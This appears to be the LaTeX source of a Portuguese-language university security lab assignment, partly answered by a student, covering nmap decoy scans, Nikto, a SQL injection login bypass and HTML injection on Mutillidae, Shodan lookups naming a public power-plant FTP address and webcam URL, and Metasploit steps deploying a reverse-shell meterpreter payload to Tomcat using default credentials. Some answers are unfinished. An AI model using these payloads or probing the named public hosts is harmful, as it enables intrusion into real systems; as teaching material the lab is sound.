%-------------------------------------------------------------------------------
\documentclass{article}

%-------------------------------------------------------------------------------
% Packages

% Translation
\usepackage[brazilian]{babel}

% General
\usepackage{amsmath}
\usepackage{environ}
\usepackage{graphicx}
\usepackage[margin=1in]{geometry}
\usepackage{minted}
\usepackage{xcolor}

\setminted{%
    autogobble,
    xleftmargin=4em,
}

% To-do List
\usepackage{amssymb}
\usepackage{pifont}
\usepackage{enumitem}

% Other
\usepackage{hyperref}
\usepackage[brazilian]{cleveref} % Must be after hyperref


% Custom lists
\newlist{todolist}{itemize}{2}
\setlist[todolist]{label=$\square$}
\newcommand{\done}{%
    \rlap{$\square$}{%
        \raisebox{2pt}{\large\hspace{1pt}\ding{51}
    }}\hspace{-2.5pt}
}

%-------------------------------------------------------------------------------
% User-commands
\newcommand{\todo}[1]{{\color{red}{#1}}}

\newcommand{\code}[1]{\texttt{#1}}
\newcommand{\img}[1]{%
    \includegraphics[width=1\textwidth, height=1\textheight, keepaspectratio]{#1}
}

\NewEnviron{superframe}{%
    \begin{center}
        \fbox{\setlength{\fboxsep}{1em}\fbox{\parbox{5.5in}{%
            \BODY{}
        }}}
    \end{center}
}

\NewEnviron{answer}{%
    \begin{samepage}
        \begin{solution}
            \BODY{}
        \end{solution}
    \end{samepage}
}

\renewcommand{\thesection}{Parte \arabic{section}.}

%-------------------------------------------------------------------------------
% Project configs
\title{%
    Segurança em Computação \\
    Trabalho Individual IV
}
\author{João Paulo Taylor Ienczak Zanette}
\date{\today}

%------------------------------------------------------------------------------
\begin{document}
    \maketitle{}

    %--------------------------------------------------------------------------
    \section{Usando o NMAP}

    \begin{superframe}
        Copie e cole screenshots de telas obtidas na execução dos comandos.
        Explique brevemente a saída obtida em cada um dos comandos das questões
        1, 2, 3 e 4.
    \end{superframe}

    \begin{enumerate}
        \item \texttt{nmap -sV -O 10.1.2.6};

            O comando mostra todas as portas abertas (flag \code{-sV}), quais
            serviços (e suas respectivas versões) estão mapeados a elas. No
            final são mostradas informações do SO do \textit{host} 10.1.2.6
            (flag \code{-O}).

            \img{imgs/q1_1}

        \item \texttt{nmap -v -A 10.1.2.6};

            O comando mostra, com um bom nível de detalhes (por causa da flag
            de verbosidade --- \code{-v}), sobre:
            \begin{itemize}
                \item Portas, serviços e suas versões;
                \item Sistema Operacional do \textit{host};
                \item Resultado da execução de alguns scripts para buscar
                    informações do \textit{host} (como configurações);
                \item Rota de rede (\textit{traceroute}).
            \end{itemize}

            \img{imgs/q1_2_1}
            \img{imgs/q1_2_2}
            \img{imgs/q1_2_3}

        \item \texttt{nmap -sS -v --top-ports 10 --reason -oA saidanmap
            www.ufsc.br};

            O comando mostra as 10 portas mais comuns, estejam abertas ou não,
            utilizando TCP SYN, mostrando a resposta dada pela porta
            (\code{--reason}), e joga o resultado para três arquivos (um para
            cada extensão: \code{nmap}, \code{xml}, \code{gnmap}) com o prefixo
            \code{saidanmap}.

            \img{imgs/q1_3_1}
            \img{imgs/q1_3_2}

        \item \textbf{Crie um comando com opções diferentes das usadas nas
                questões anteriores e explique a saída obtida pelo seu
                comando.}

            1º Comando: \code{nmap -sS 10.1.2.6 -D 192.168.0.2}. Esse comando
            faz um SYN Scan em \code{10.1.2.6}, porém usando \code{192.168.0.2}
            como \textit{decoy}, de forma que os \textit{scans} se passem por
            originados de algum outro endereço, dificultando a detecção de
            \textit{scans}.

            \img{imgs/q1_4_1}

            2º Comando: \code{nmap -sP 10.1.2.*}. Esse comando faz um
            \textit{scan}, mas não por portas, e sim por quais os endereços
            ativos no intervalo \code{10.1.2.0} a \code{10.1.2.255}. É possível
            identificar as duas VMs através disso.

            \img{imgs/q1_4_2}

        \item Responda:
            \begin{enumerate}
                \item \textbf{Qual a diferença entre um scan de conexão TCP e
                        um SYN scan?}

                    Um SYN Scan espera apenas pelo ACK de um sinal de SYN,
                    servindo então para \textit{scans} rápidos.

                    Um TCP Scan executa todo o protocolo para se
                    estabelecer uma conexão TCP (incluindo o
                    \textit{handshake}), sendo portanto mais lento.

                \item \textbf{Qual questão anterior usa scan de conexão TCP e
                        qual questão usa SYN scan?}

                    A questão 3 é a única que usa um SYN Scan (fora o comando
                    próprio na questão 4). Os demais usam todos TCP Scan.

                \item \textbf{Comente pelo menos uma vulnerabilidade da máquina
                        Owasp Broken, listando a identificação CVE
                        (\url{cve.mitre.org}) da vulnerabilidade.}

                    A assinatura de mensagens não está habilitada por padrão
                    (\code{CVE-2017-12150}). Isso só foi corrigido na versão
                    4.4.16, e as versão do Samba rodando no Owasp são a versão
                    3 e possivelmente 4, porém anteriores à 4.4.16.
            \end{enumerate}
    \end{enumerate}

    %--------------------------------------------------------------------------
    \section{Nikto}

    \begin{enumerate}
        \setcounter{enumi}{5}
        \item Execute o comando \code{nikto -host http://10.1.2.6/Wacko -o
            nikto.html -format htm}.

            \begin{enumerate}
                \item \textbf{Copie e cole screenshots de telas obtidas na
                        execução do comando;}

                    \img{imgs/q1_5}

                \item \textbf{Explique o que mais chamou sua atenção na saída
                    obtida.  Explique também alguma vulnerabilidade encontrada
                    nessa aplicação (WackoPicko) que consta no relatório do
                    arquivo muti.html.}

                    Primeiramente, me chamou atenção a existência de Python2.6
                    quando há milênios estamos com Python 2.7. Fora isso,
                    vários pacotes estão muito desatualizados (PHP 5 já havia
                    sido um grande \textit{update} de segurança, e mesmo assim
                    está \textit{outdated} há bastante tempo). Há também a não
                    definição de um \textit{header} de proteção contra XSS\@.
                    Isso se reflete no relatório do ZAP pela presença de
                    vulnerabilidades grandes como XSS e SQL Injection.
            \end{enumerate}
    \end{enumerate}

    %--------------------------------------------------------------------------
    \section{OWASP}

    \begin{enumerate}
        \setcounter{enumi}{6}
        \item Explique as vulnerabilidades A1, A2, A3 e A7 do documento TOP
            TEN 2017:
            \url{https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf};
        \item Faça:
            \begin{enumerate}
                \item \textbf{Acesse a aplicação Mutillidae: abra o browser da
                        sua máquina real ou na Kali Linux no site
                        \url{http://<IP da Kali>/mutillidae} e clique em Login.
                        No campo Username, digite \texttt{' or 1=1 -- }. O
                        campo password pode ficar em branco. Copie e cole a
                    tela do seu experimento;}

                    \img{imgs/q2_2}

                \item \textbf{Explique o resultado obtido e a vulnerabilidade
                    explorada no experimento (pesquise no documento do TOP 10
                da OWASP);}

                    Foi explorado o uso de SQL Injection, que simplesmente
                    consiste em o \textit{input} do usuário ser inserido
                    diretamente na query, algo como:

                    \begin{minted}{sql}
                        select user.name
                        from users
                        where user.name='%s' and user.password='%s'
                    \end{minted}

                    Ao se inserir \code{' or 1=1 -- }, o texto formatado vira:

                    \begin{minted}{sql}
                        select user.name
                        from users
                        where user.name='' or 1=1 -- user.password=''
                    \end{minted}

                    Ou seja, a verificação de senha é comentada, e \code{1=1} é
                    sempre verdadeiro. Logo, um \code{or} com verdadeiro é uma
                    tautologia, e portanto é sempre logado no primeiro usuário
                    que der match na query, que potencialmente é o admin
                    (inclusive, nesse caso, foi o admin).

                \item \textbf{O que pode ser feito para impedir a exploração
                    dessa vulnerabilidade?}

                    Basta sanitizar a entrada, o que geralmente consiste em
                    simplesmente escapar caracteres que não sejam alfanuméricos
                    (como aspas, que se tornarão \code{\textbackslash'} em vez
                    de \code{'}).

                \item \textbf{Clique em Logout.}

                    Ok.

            \end{enumerate}
        \item \textbf{Repita a inserção da mesma string anterior no seguinte
                link: \url{http://<IP da
            Kali>/mutillidae/index.php?page=user-info.php};}
            \begin{enumerate}
                \item \textbf{Explique a vulnerabilidade explorada no
                    experimento (pesquise no documento do TOP 10 da OWASP);}

                    Nesse caso, o SQL Injection apenas fez com que todos os
                    resultados da busca fossem trazidos (afinal, o resultado é
                    sempre verdadeiro), dando acesso a dados confidenciais. Não
                    só isso, revela que todas as senhas estão em em
                    \textit{plaintext}.

                \item \textbf{Copie e cole um screenshot da execução de um
                    experimento;}

                    \img{imgs/q2_3}

                \item \textbf{O que pode ser feito para impedir a exploração
                    dessa vulnerabilidade?}

                    Sanitizar a entrada, assim como na questão anterior. E
                    cifrar as senhas.
            \end{enumerate}
        \item \textbf{Você deve utilizar a ferramenta OWASP ZAP (Zed Attack
                Proxy) da Kali Linux. As ferramentas de scan de web são
                encontradas no menu Kali-Linux -> O3 --- Web Application
                Analysis -> owasp-zap. Faça um scan das vulnerabilidades da
                aplicação WackoPicko da máquina OWASP Broken usando a
            ferramenta. Faça:}

            \begin{enumerate}
                \item \textbf{Coloque a URL da aplicação --- \url{http://<IP da
                        OWASP>/WackoPicko} --- e clique em ``Attack''. A
                        análise básica é iniciada. Demora um pouco (de 8 a 10
                        minutos) e você deve salvar o relatório geral do
                        processo (opção Report -> Generate HTML Report). Os
                        alertas (aba Alerts) vão listando as vulnerabilidades
                        encontradas. Na aba Active Scan é possível ver os
                    requests sendo enviados.}

                \item \textbf{Comente o experimento e os resultados
                    alcançados.}

                    hmmm.
            \end{enumerate}
    \item \textbf{Observe a lista de vulnerabilidades da aplicação
        Mutillidae disponível em \url{http://<IP da
        Kali>/mutillidae/index.php?page=./documentation/vulnerabilities.php}.
        Agora você deve escolher duas vulnerabilidades do TOP 10 2017
        da lista da OWASP e criar uma forma de ataque para cada uma das
        vulnerabilidades escolhidas. Assim, você deve criar dois
        ataques (devem ser diferentes dos ataques das questões 8 e 9).
        Documente os experimentos e mostre funcionando na apresentação.
        Na apresentação você também deve explicar as vulnerabilidades.}

        1ª Vulnerabilidade: HTML Injection. Como não há sanitização no
        formulário de cadastro, é possível cadastrar um usuário com nome
        ``\mintinline{text}{José <iframe
        src="forum.cagr.ufsc.br/listarMembros.jsf?busca=sim"> Freitas}'',
        ou ainda um usuário com o corpo completo do HTML da página do
        \code{iframe} como nome.
        Isso permite que se crie, por exemplo, um usuário com nome que seja
        um conteúdo HTML semelhante ao que se esperaria de uma página comum
        do servidor, porém contenha algum JavaScript que retire o contéudo
        original (ficando então exibido só o conteúdo falso), e direcione
        requisições do input do usuário para alguma ação maliciosa.

        Mais uma vez, isso se dá pela entrada não ser sanitizada, fazendo
        com que o nome do usuário seja interpretado diretamente como HTML
        válido. Então se há um \code{<h1>} nele, isso será contado como um
        elemento HTML e portanto se terá um bloco de heading que não estava
        planejado.
    \end{enumerate}

    \section{Vulnerabilidades em IoT}

    \begin{enumerate}
        \setcounter{enumi}{11}
        \item \textbf{Leia a reportagem com título ``Find webcams, databases,
            boats in the sea using Shodan'' disponível em
            \url{https://www.securitynewspaper.com/2018/11/27/find-webcams-databases-boats-in-the-sea-using-shodan/}.
            Responda:}

            \begin{enumerate}
                \item \textbf{O que é o Shodan e o que é possível fazer com esse site?}

                    Shodan é um site que busca por câmeras de monitoramento e
                    dispositivos semelhantes que estejam publicamente
                    disponíveis (seja por utilizarem configurações padrões de
                    autenticação, por exemplo, ou estarem explicitamente
                    abertas ao público).

                \item \textbf{(Apresentação) Faça o registro no site, pesquise
                    e liste algum dispositivo IoT que você encontrou.}

                    Buscando por dispositivos do tipo ``Power Plant'', foi
                    encontrada uma usina da Calpide Industries em Scottsdale,
                    USA, com IP \code{50.62.101.66} e porta 21, comumente
                    utilizada para FTP. Ou seja, provalmente é o servidor da
                    usina.
            \end{enumerate}

        \item Conforme descrito na reportagem, acesse o link
            \url{http://166.161.197.253:5001/cgi-bin/guestimage.html}. É uma
            câmera Mobotix. Responda:

            \begin{enumerate}
                \item O que é possível visualizar?
                \item Um atacante poderia fazer o que com este acesso?
            \end{enumerate}
    \end{enumerate}

    \section{Metasploit}

    \subsection{%
        Usando o Metasploit para explorar o TOMCAT na máquina Owasp Broken
    }

    O servidor Apache Tomcat é um servidor web Java.

    \begin{minted}{console}
        msf > search tomcat
    \end{minted}

    Com o comando search tomcat é possível identificar os exploits disponíveis.
    Procure o nome do módulo:

    \begin{minted}{text}
        Name ... Description
        auxiliary/scanner/http/tomcat_mgr_login ... Tomcat Application Manager Login Utility
    \end{minted}

    Para usar este módulo digite:

    \begin{minted}{console}
        msf > use auxiliary/scanner/http/tomcat_mgr_login
        msf > show options
    \end{minted}

    As opções mostram o que pode ser configurado para usar o módulo escolhido.
    Nem tudo precisa ser configurado.

    Digite os comandos abaixo. Copie e cole o screenshot da sua tela no
    relatório da tarefa ao realizar o experimento:

    \begin{minted}{console}
        msf auxiliary(tomcat_mgr_login) > set RHOSTS 10.1.2.6
        msf auxiliary(tomcat_mgr_login) > set RPORT 8080 (Porta do Tomcat)
        msf auxiliary(tomcat_mgr_login) > exploit
    \end{minted}

    Este módulo executa um ataque do dicionário, utilizando os arquivos
    indicados nas variáveis indicadas acima. Neste ataque uma das combinações
    utilizadas poderá ser aceita pelo servidor.

    \begin{superframe}
        \begin{enumerate}
            \setcounter{enumi}{13}
            \item Copie e cole a screenshot da sua tela ao realizar o
                experimento anterior. Depois, explique o experimento:

                \begin{enumerate}
                    \item O que é o ataque do dicionário?
                    \item O que foi encontrado?
                    \item Qual foi a vulnerabilidade usada para obter esse
                        resultado?
                    \item Como pode ser explorado esse resultado?
                \end{enumerate}
        \end{enumerate}
    \end{superframe}

    O \code{tomcat\_mgr\_deploy} pode usar diferentes payloads. O payload
    identifica o código que o módulo deve executar e que deve ser entregue ao
    alvo.

    \begin{minted}{console}
        msf exploit(tomcat_mgr_deploy) > show payloads
    \end{minted}

    Digite os comandos:

    \begin{minted}{console}
        msf > use exploit/multi/http/tomcat_mgr_deploy
        msf exploit(tomcat_mgr_deploy) > set RHOSTS x.x.x.x (IP da máquina Owasp)
        msf exploit(tomcat_mgr_deploy) > set HttpUsername root
        msf exploit(tomcat_mgr_deploy) > set HttpPassword owaspbwa
        msf exploit(tomcat_mgr_deploy) > set RPORT 8080
        msf exploit(tomcat_mgr_deploy) > show options
        msf exploit(tomcat_mgr_deploy) > show payloads
        msf exploit(tomcat_mgr_deploy) > set payload java/meterpreter/reverse_tcp
        msf exploit(tomcat_mgr_deploy) > show options
        msf exploit(tomcat_mgr_deploy) > set LHOST 10.1.2.7 -> colocar IP da Kali
        msf exploit(tomcat_mgr_deploy) > exploit
    \end{minted}

    Nesse prompt (meterpreter) podem ser executados comandos. Ao conseguir
    chegar no prompt do meterpreter você está com um tipo de shell na máquina
    alvo. Digite help no prompt do meterpreter para listar os comandos
    possíveis que poderão ser executados.

    \begin{superframe}
        \begin{enumerate}
            \setcounter{enumi}{14}
            \item Copie e cole a screenshot da sua tela de estabelecimento de
                sessão (inclua na imagem a parte dos IPs, data e hora dos
                experimentos). Agora, explique os experimentos respondendo
                perguntas:

            \begin{enumerate}
                \item Qual a vulnerabilidade que está sendo explorada?
                \item O que faz o exploit para explorar a vulnerabilidade?
                \item O que é o meterpreter?
                \item O que é possível fazer depois que o exploit é executado?
                    Use pelo menos dois comandos do meterpeter listados com o
                    comando help e explique cada um deles, colocando a imagem
                    da execução dos seus comandos. Alguns comandos para
                    máquinas Windows não funcionarão na máquina Linux.
            \end{enumerate}
        \end{enumerate}
    \end{superframe}

    Sequência de meterpreters:

    --- ps
    ---
\end{document}
